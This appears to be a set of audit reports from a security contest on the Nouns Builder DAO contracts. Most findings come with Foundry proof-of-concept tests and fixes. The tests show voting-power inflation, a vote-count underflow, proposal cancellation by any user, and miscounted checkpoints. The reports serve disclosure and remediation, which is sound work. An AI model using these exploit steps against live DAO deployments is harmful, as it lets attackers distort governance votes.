[MetadataRenderer.sol:32](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L32) - [Token.sol:30](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L30) - [Auction.sol:39](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L39) - [Governor.sol:41](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L41)  ## **3. Integer overflow by unsafe casting**  Keep in mind that the version of solidity used, despite being greater than `0.8`, does not prevent integer overflows during casting, it only does so in mathematical operations.  It is necessary to safely convert between the different numeric types.  **Example:**  A dangerous example is with the `quorum` method.  ```javascript         proposal.quorumVotes = uint32(quorum()); ```  This method depends the token's `totalSupply`, so it could overflow with certains tokens.  ```javascript function quorum() public view returns (uint256) {     unchecked {         return (settings.token.totalSupply() * settings.quorumThresholdBps) / 10_000;     } } ```  **Recommendation:**  Use a [safeCast](https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast) from Open Zeppelin.  **Affected source code:**  - [ERC721Votes.sol:252](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252) - [Token.sol:88](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88) - [Token.sol:98](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L98) - [Token.sol:99](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L99) - [Token.sol:123](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L123) - [Token.sol:124](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L124) - [Auction.sol:149](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L149) - [Auction.sol:223](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L223) - [Auction.sol:224](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L224) - [Governor.sol:168](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L168) - [Governor.sol:280](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L280) - [Governor.sol:285](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L285) - [Governor.sol:290](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L290)  ## **4. Lack of checks**  The following methods have a lack of checks if the received argument is an address, it's good practice in order to reduce human error to check that the address specified in the constructor or initialize is different than `address(0)`.  **Affected source code for `address(0)`:**  - [Manager.sol:62-66](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L62-L66) - [MetadataRenderer.sol:33](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L33) - [Treasury.sol:33](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L33) - [Token.sol:31](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L31) - [Token.sol:65](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L65) - [Token.sol:66](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L66) - [Auction.sol:40](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L40) - [Auction.sol:41](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L41) - [Auction.sol:79](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L79) - [Governor.sol:42](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L42)  **It wasn't checked `_delay` max value (E.g. more than 1 month...):**  - [Treasury.sol:43](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L43)  ## **5. Not fully decentralized**  The `updateVotingDelay`, `updateVotingPeriod`, `updateProposalThresholdBps`, `updateQuorumThresholdBps`, `updateVetoer`, `burnVetoer` methods in the `Governor` contract have the `onlyOwner` modifier, but to be fully decentralized, these methods must verify that the address is the same as the contract himself to force a proposal to call these methods.  **Affected source code:**  - [Governor.sol:564-609](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L564-L609)  ## **6. Unsecure state order**  Negative states must be processed before positive states, otherwise, a proposal that is `Expired` or `Executed`, but is `Active` or `Pending` will be returned as `Active` or `Pending`, this makes it necessary to check that the state is correct from outside this method. I mean, changing outside the variables that alter this state in the correct way.  ```diff     function state(bytes32 _proposalId) public view returns (ProposalState) {         // Get a copy of the proposal         Proposal memory proposal = proposals[_proposalId];          // Ensure the proposal exists         if (proposal.voteStart == 0) revert PROPOSAL_DOES_NOT_EXIST();          // If the proposal was executed:         if (proposal.executed) {             return ProposalState.Executed;              // Else if the proposal was canceled:         } else if (proposal.canceled) {             return ProposalState.Canceled;              // Else if the proposal was vetoed:         } else if (proposal.vetoed) {             return ProposalState.Vetoed;              // Else if voting has not started:         } else if (block.timestamp < proposal.voteStart) {             return ProposalState.Pending;  +           // Else if the proposal can no longer be executed: +       } else if (settings.treasury.isExpired(_proposalId)) { +           return ProposalState.Expired; -           // Else if voting has not ended: -       } else if (block.timestamp < proposal.voteEnd) { -           return ProposalState.Active;              // Else if the proposal failed (outvoted OR didn't reach quorum):         } else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {             return ProposalState.Defeated;  +           // Else if voting has not ended: +       } else if (block.timestamp < proposal.voteEnd) { +           return ProposalState.Active;             // Else if the proposal has not been queued:         } else if (settings.treasury.timestamp(_proposalId) == 0) {             return ProposalState.Succeeded;  -           // Else if the proposal can no longer be executed: -       } else if (settings.treasury.isExpired(_proposalId)) { -           return ProposalState.Expired;              // Else the proposal is queued         } else {             return ProposalState.Queued;         }     } ```  **Affected source code:**  - [Governor.sol:413-456](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L413-L456)  ## **7. Timestamp dependence**  There are three main considerations when using a timestamp to execute a critical function in a contract, especially when actions involve fund transfer.  - Timestamp manipulation   - Be aware that the timestamp of the block can be manipulated by a miner - The 15-second Rule   - The [Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf) (Ethereumâ€™s reference specification) does not specify a constraint on how much blocks can drift in time, but [it does specify](https://ethereum.stackexchange.com/a/5926/46821) that each timestamp should be bigger than the timestamp of its parent. Popular Ethereum protocol implementations Geth and Parity both reject blocks with timestamp more than 15 seconds in future. Therefore, a good rule of thumb in evaluating timestamp usage is: if the scale of your time-dependent event can vary by 15 seconds and maintain integrity, it is safe to use a `block.timestamp`. - Avoid using `block.number` as a timestamp   - It is possible to estimate a time delta using the `block.number` property and [average block time](https://etherscan.io/chart/blocktime), however this is not future proof as block times may change (such as [fork reorganisations](https://blog.ethereum.org/2015/08/08/chain-reorganisation-depth-expectations) and the [difficulty bomb](https://github.com/ethereum/EIPs/issues/649)). In a sale spanning days, the 15-second rule allows one to achieve a more reliable estimate of time.   See [SWC-116](https://swcregistry.io/docs/SWC-116)  **Reference:**  - https://consensys.net/blog/developers/solidity-best-practices-for-smart-contract-security/  **Affected source code:**  - [Treasury.sol:89](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/Treasury.sol#L89)  ---  # Non critical  ## **8. Use `abstract` for base contracts**  `abstract` contracts are contracts that have at least one function without its implementation. **An instance of an abstract cannot be created.**  **Reference:**  - https://docs.soliditylang.org/en/v0.6.2/contracts.html#abstract-contracts  **Affected source code:**  - [TokenStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/storage/TokenStorageV1.sol#L9) - [MetadataRendererStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/storage/MetadataRendererStorageV1.sol#L9) - [ManagerStorageV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/storage/ManagerStorageV1.sol#L7) - [TreasuryTypesV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/types/TreasuryTypesV1.sol#L7) - [TreasuryStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/treasury/storage/TreasuryStorageV1.sol#L9) - [GovernorStorageV1.sol:9](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/storage/GovernorStorageV1.sol#L9) - [AuctionTypesV1.sol:7](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/types/AuctionTypesV1.sol#L7) - [AuctionStorageV1.sol:10](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/storage/AuctionStorageV1.sol#L10)  ## **9. Avoid duplicate logic**  Use [Address.toBytes32](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/utils/Address.sol#L26) instead of replicate the logic.  **Affected source code:**  - [Manager.sol:123](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L123) - [Manager.sol:165](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/manager/Manager.sol#L165)  ## **10. Avoid hardcoded values**  It is not good practice to hardcode values, but if you are dealing with addresses much less, these can change between implementations, networks or projects, so it is convenient to remove these addresses from the source code.  use selectors:  - [ERC721.sol:63-L65](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721.sol#L63-L65)  Use `immutable` with the formula, instead of the result:  - [ERC1967Upgrade.sol:21](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Upgrade.sol#L21) - [ERC1967Upgrade.sol:24](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/proxy/ERC1967Upgrade.sol#L24)  ## **11. Unpredictable change of owner**  The `MetadataRenderer.addProperties` method takes advantage when `ipfsData` is not defined to transfer the owner to the treasury, however this logic should be done in an initialization method and not in a configuration one, since the user does not expect this type of change when calling to this type of methods, it is convenient to adapt the logic or mention this behavior in a comment.  **Affected source code:**  - [MetadataRenderer.sol:102](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/metadata/MetadataRenderer.sol#L102)  ## **12. Improve user experience**  In the `Auction._handleOutgoingTransfer` method, before throwing the `INSOLVENT` error, check if the contract has `WETH`, because maybe it's possible to send `WETH` instead of an throwing an error.  ```javascript     function _handleOutgoingTransfer(address _to, uint256 _amount) private {         // Ensure the contract has enough ETH to transfer         if (address(this).balance < _amount) revert INSOLVENT();          // Used to store if the transfer succeeded         bool success;          assembly {             // Transfer ETH to the recipient             // Limit the call to 50,000 gas             success := call(50000, _to, _amount, 0, 0, 0, 0)         }          // If the transfer failed:         if (!success) {             // Wrap as WETH             IWETH(WETH).deposit{ value: _amount }();              // Transfer WETH instead             IWETH(WETH).transfer(_to, _amount);         }     } ```  **Affected source code:**  - [Auction.sol:346](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L346)  
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol#L209   # Vulnerability details  ### Impact  [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) implements a different pattern to contract upgradeability only performing an authorisation check and not ensuring that the new Manager implementation has been registered as an upgrade via `isRegisteredUpgrade()`.  The impact is that an upgrade to the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) does not require a two step approval and be registered via `registerUpgrade()` . Additionally there is no notification event that the Manager implementation has been registered for an upgrade i.e. `UpgradeRegistered`.  In this respect the [Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol) contract has a different implementation to other contracts that make up the DAO (e.g. [Token.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/Token.sol#L305) and [Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L618)) and doesnâ€™t follow the process described in the [IManager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/IManager.sol) interface, namely that upgrades are registered via `registerUpgrade()`. and therefore emit the `UpgradeRegistered` event for transparency and monitoring/auditing.  ### Proof of Concept  When comparing `_authorizeUpgrade()` in Manager.sol and Token.sol the implementations differ;  ```solidity // Manager.sol function _authorizeUpgrade(address _newImpl) internal override onlyOwner {}  // Token.sol function _authorizeUpgrade(address _newImpl) internal view override {   // Ensure the caller is the shared owner of the token and metadata renderer   if (msg.sender != owner()) revert ONLY_OWNER();    // Ensure the implementation is valid   if (!manager.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  When the Manager.sol implementation is updated it **will not** check whether a new implementation has been registered. The `upgradeTo()` function in [UUPS.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/proxy/UUPS.sol) will be called checking authorisation and then upgrading the implementation;  ```solidity // UUPS.sol function upgradeTo(address _newImpl) external onlyProxy {     _authorizeUpgrade(_newImpl);     _upgradeToAndCallUUPS(_newImpl, "", false); } ```  However unlike Token.sol, Manager.sol performs no checks as to whether the implementation has been registered only checking that the calling entity is the owner.  ### Tools Used  Vim  ### Recommended Remediation Steps  To make Manager.sol consistent with the IManager interface and other contracts in the DAO it should have the same functionality implemented in `_authoriseUpgrade()` (see below);  ```solidity function _authorizeUpgrade(address _newImpl) internal view override onlyOwner {   if (!this.isRegisteredUpgrade(_getImplementation(), _newImpl)) revert INVALID_UPGRADE(_newImpl); } ```  As well as this the [NounsBuilderTest.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/test/utils/NounsBuilderTest.sol) should be updated to perform `.registerUpgrade()` before `.upgradeTo()`. For example;  ```solidity // L71 of NounsBuilderTest.sol vm.startPrank(zoraDAO);   manager.registerUpgrade(managerImpl0, address(managerImpl));   manager.upgradeTo(managerImpl);   vm.stopPrank(); } ```  Then all tests can be run and they will pass.
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L234   # Vulnerability details   The `_createAuction` function wraps the `token.mint()` call in a try-catch block, however this will only catch reverts that comes from the require keyword and not the reverts with custom errors or other kinds of errors (arithmetic over/underflow etc.)  ## Impact In case of an error at the `mint()` function the auction won't be settled till the owner intervenes and pauses the contract.  ## Proof of Concept Here's a test that proves that `catch Error()` doesn't catch custom errors (the test will fail):  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol";  contract ContractTest is Test {     function testErr() public{         Reverter r = new Reverter();         try r.throwCustomError(){          }catch Error(string memory) {          }     } }  contract Reverter{     error  MyErr();      function throwCustomError() public{         revert MyErr();     } }   ```  ## Recommended Mitigation Steps  Remove the `Error` so that it'll catch any kind of revert:  ```diff              // Pause the contract if token minting failed -        } catch Error(string memory) { +        } catch  {              _pause();          }      } ```
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268   # Vulnerability details  ## `_transferFrom()` can be used to indefinitely increase voting power. ### Impact It is possible to indefinitely increase voting power by creating new accounts (addresses) and delegating. This will lead to unfair governance as a user can vote with more votes than actual.  ### Explanation The `_transferFrom()`  does not move delegates from the src's delegates to the destination's delegates, instead, it moves directly from src to dest. (see recommendations and Code POC for better understanding)  ### Code POC ```solidity // Insert this test case into Token.t.sol // Run: forge test --match-contract Token -vv  import "forge-std/console.sol"; ... function testIncreaseVotePower() public {         deployMock();          address voter1;         address voter2;         uint256 voter1PK;         uint256 voter2PK;          // Voter with 1 NFT voting power         voter1PK = 0xABC;         voter1 = vm.addr(voter1PK);         vm.deal(voter1, 1 ether);         // Second account created by same voter         voter2PK = 0xABD;         voter2 = vm.addr(voter2PK);    // Giving voter1 their 1 NFT         vm.prank(founder);         auction.unpause();         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(2);         vm.warp(auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();          // Start Exploit         console.log("Initial Votes");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));                  vm.prank(voter1);         token.delegate(voter2);         console.log("After Delegating Votes, voter1 -> delegate(voter2)");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));          vm.prank(voter1);         token.transferFrom(voter1, voter2, 2);          console.log("After Token transfer, voter1 -transferFrom()-> voter2");         console.log("voter1 votes: ", token.getVotes(voter1));         console.log("voter2 votes: ", token.getVotes(voter2));          vm.prank(voter2);         token.delegate(voter2);         console.log("After Delegating Votes, voter2 -> delegate(voter2)");         console.log("voter1: ", token.getVotes(voter1));         console.log("voter2: ", token.getVotes(voter2));     } ``` Expected Output: ```solidity [PASS] testVoteDoublePower() (gas: 3544946) Logs:   Initial Votes   voter1:  1   voter2:  0   After Delegating Votes, voter1 -> delegate(voter2)      voter1:  1   voter2:  1   After Token transfer, voter1 -transferFrom()-> voter2   voter1 votes:  0   voter2 votes:  2   After Delegating Votes, voter2 -> delegate(voter2)      voter1:  0   voter2:  3 ``` ### Recommendations Looking at [OpenZeppelin's ERC721Votes](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/6a8d977d2248cf1c115497fccfd7a2da3f86a58f/contracts/token/ERC721/extensions/draft-ERC721Votes.sol#L13) which I believe the team took reference from, it states: ``` * Tokens do not count as votes until they are delegated, because votes must be tracked which incurs an additional cost * on every transfer. Token holders can either delegate to a trusted representative who will decide how to make use of * the votes in governance decisions, or they can delegate to themselves to be their own representative. ``` The current implementation does not follow this, and tokens count as votes without being delegated. To fix this issue, votes should only be counted when delegated. - I believe the issue is here on this [line](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L268) ```solidity // Transfer 1 vote from the sender to the recipient Â  Â  Â  Â  _moveDelegateVotes(_from, _to, 1); ``` Where it should move from the delegate of `_from` to the delegate of `_to`. Suggested FIx: ```solidity Â _moveDelegateVotes(delegation[_from], delegation[_to], 1); ``` 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/token/ERC721Votes.sol#L179-L190   # Vulnerability details  ## Impact Assuming an existing bug in the `_delegate` function is fixed (see my previous issue submission titled "Delegating votes leaves the token owner with votes while giving the delegate additional votes"): if a user delegates to address(0) that vote gets lost.  ## Proof of Concept  Assuming the `_delegate` function gets patched by changing: `address prevDelegate = delegation[_from];` to `address prevDelegate = delegates(_from);`  The steps to be taken:  1. User (U) gets one NFT (e.g by winning the auction)  a. votes(U) = 1 2. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 0, votes(address(0)) = 0 3. U delegates to address(0) // prevDelegate is U, so votes(U)--  a. votes(U) = 2^192 - 1  Below is a forge test showing the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import { NounsBuilderTest } from "../utils/NounsBuilderTest.sol"; import { TokenTypesV1 } from "../../src/token/types/TokenTypesV1.sol";  contract TokenTest is NounsBuilderTest, TokenTypesV1 {     address user1 = address(0x1001);     address delegate1 = address(0x2001);     address delegate2 = address(0x2002);      function setUp() public virtual override {         super.setUp();          vm.label(user1, "user1");         vm.label(delegate1, "delegate1");         deployMock();     }      function setMockFounderParams() internal virtual override {         address[] memory wallets = new address[](1);         uint256[] memory percents = new uint256[](1);         uint256[] memory vestingEnds = new uint256[](1);          wallets[0] = founder;         percents[0] = 0;         vestingEnds[0] = 4 weeks;          setFounderParams(wallets, percents, vestingEnds);     }      function test_pown2() public {         // user1 gets one token         vm.startPrank(address(auction));         token.mint();         token.transferFrom(address(auction), user1, 0);         vm.stopPrank();          // user1 has 1 token & 1 vote         assertEq(token.balanceOf(user1), 1);         assertEq(token.getVotes(user1), 1);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), 0);          vm.prank(user1);         token.delegate(address(0));         assertEq(token.getVotes(user1), type(uint192).max);     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Either: 1. Don't allow delegation to address(0) by adding a check or 2. If someone tries to delegate to address(0), delegate to the NFT owner instead
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L128 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L363   # Vulnerability details  ## Impact If the proposer of a proposal has votes in the same amount as the proposalThreshold, they can create a proposal. But in this case, anyone can also cancel this proposal.  When creating a proposal the requirement is "Ensure the caller's voting weight is greater than or equal to the threshold". When cancelling a proposal the check is: if `getVotes(proposal.proposer, block.timestamp - 1) > proposal.proposalThreshold` then it the cancelling is not allowed. In effect, if the number of votes is lower than *or equal* to the proposalThreshold it can be cancelled.  In the extreme case where all the DAO members have no more than the proposalThreshold amount of votes, every proposal can be cancelled.  ## Proof of Concept The forge test below demonstrates the issue:  ``` // SPDX-License-Identifier: MIT pragma solidity 0.8.15;  import "forge-std/console.sol"; import { NounsBuilderTest } from "../utils/NounsBuilderTest.sol";  import { IManager } from "../../src/manager/IManager.sol"; import { IGovernor } from "../../src/governance/governor/IGovernor.sol"; import { GovernorTypesV1 } from "../../src/governance/governor/types/GovernorTypesV1.sol";  contract GovCancelWrongCheckTest is NounsBuilderTest, GovernorTypesV1 {     uint256 internal constant AGAINST = 0;     uint256 internal constant FOR = 1;     uint256 internal constant ABSTAIN = 2;     uint256 proposalThresholdBps = 100;      address internal voter1 = address(0x1234);     address internal randomUser = address(0x8888);      function setUp() public virtual override {         super.setUp();          deployMock();     }      function testCanCancelProposalIfExactThreshold() public {         // mint a few tokens         for (uint256 i; i < 85; i++) {             vm.prank(address(auction));             token.mint();         }         assertEq(token.totalSupply(), 100);          // transfer one token to voter1         vm.prank(address(auction));         token.transferFrom(address(auction), voter1, 5);         assertEq(token.balanceOf(voter1), 1);          // make sure voter has enough votes         assertEq(governor.proposalThreshold(), 1);         assertEq(token.getVotes(voter1), 1);          vm.warp(block.timestamp + 1);          // propose         (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();         vm.prank(voter1);         bytes32 proposalId = governor.propose(targets, values, calldatas, "test");          // Proposal created successfully         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Pending));          // Cancel proposal         vm.prank(randomUser);         governor.cancel(proposalId);         assertEq(uint256(governor.state(proposalId)), uint256(ProposalState.Canceled));     }      function setMockGovParams() internal virtual override {         setGovParams(2 days, 1 seconds, 1 weeks, proposalThresholdBps, 1000);     }      function mockProposal()         internal         view         returns (             address[] memory targets,             uint256[] memory values,             bytes[] memory calldatas         )     {         targets = new address[](1);         values = new uint256[](1);         calldatas = new bytes[](1);          targets[0] = address(auction);         calldatas[0] = abi.encodeWithSignature("pause()");     } } ```  ## Tools Used Manual review  ## Recommended Mitigation Steps Change the check in `cancel` to match the requirement in `propose`; change line 363 in Governor.sol to: `if (msg.sender != proposal.proposer && getVotes(proposal.proposer, block.timestamp - 1) >= proposal.proposalThreshold)` 
# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253   # Vulnerability details  Voting power for each NFT owner is persisted within timestamp-dependent checkpoints. Every voting power increase or decrease is recorded. However, the implementation of `ERC721Votes` creates separate checkpoints with the same timestamp for each interaction, even when the interactions happen in the same block/timestamp.  ## Impact  Checkpoints with the same `timestamp` will cause issues within the `ERC721Votes.getPastVotes(..)` function and will return incorrect votes for a given `_timestamp`.  ## Proof of Concept  [lib/token/ERC721Votes.sol#L252-L253](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L252-L253)  ```solidity /// @dev Records a checkpoint /// @param _account The account address /// @param _id The checkpoint id /// @param _prevTotalVotes The account's previous voting weight /// @param _newTotalVotes The account's new voting weight function _writeCheckpoint(     address _account,     uint256 _id,     uint256 _prevTotalVotes,     uint256 _newTotalVotes ) private {     // Get the pointer to store the checkpoint     Checkpoint storage checkpoint = checkpoints[_account][_id];      // Record the updated voting weight and current time     checkpoint.votes = uint192(_newTotalVotes);     checkpoint.timestamp = uint64(block.timestamp);      emit DelegateVotesChanged(_account, _prevTotalVotes, _newTotalVotes); } ```  **Consider the following example and the votes checkpoint snapshots:**  _Note: Bob owns a smart contract used to interact with the protocol_  **Transaction 0:** Bob's smart contract receives 1 NFT through minting (1 NFT equals 1 vote)  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     |  **Transaction 1:** Bob's smart contract receives one more NFT through minting  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     |  **Transaction 1:** Within the same transaction 1, Bob's smart-contract delegates 2 votes to Alice  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     |  **Transaction 1:** Again within the same transaction 1, Bob's smart contract decides to reverse the delegation and self-delegates  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     |  **Transaction 1:** Bob's smart contract buys one more NFT  | Checkpoint Index | Timestamp | Votes | | ---------------- | --------- | ----- | | 0                | 0         | 1     | | 1                | 1         | 2     | | 2                | 1         | 0     | | 3                | 1         | 2     | | 4                | 2         | 3     |  Bob now wants to vote (via his smart contract) on a governance proposal that has been created on `timeCreated = 1` (timestamp 1).  Internally, the `Governor._castVote` function determines the voter's weight by calling `getVotes(_voter, proposal.timeCreated)`.  [governance/governor/Governor.sol#L275](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L275)  ```solidity weight = getVotes(_voter, proposal.timeCreated); ```  `getVotes` calls `ERC721.getPastVotes` internally:  [governance/governor/Governor.sol#L462](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/governance/governor/Governor.sol#L462)  ```solidity function getVotes(address _account, uint256 _timestamp) public view returns (uint256) {     return settings.token.getPastVotes(_account, _timestamp); } ```  `ERC721.getPastVotes(..., 1)` tries to find the checkpoint within the `while` loop:  | # Iteration | `low` | `middle` | `high` | | ----------- | ----- | -------- | ------ | | 0           | 0     | 2        | 4      |  The `middle` checkpoint with index `2` matches the given timestamp `1` and returns `0` votes. This is incorrect, as Bob has 2 votes. Bob is not able to vote properly.  _(Please be aware that this is just one of many examples of how this issue can lead to incorrect vote accounting. In other cases, NFT owners could have more voting power than they are entitled to)_  ## Tools Used  Manual review  ## Recommended mitigation steps  Consider batching multiple checkpoints writes per block/timestamp similar to how NounsDAO records checkpoints. 
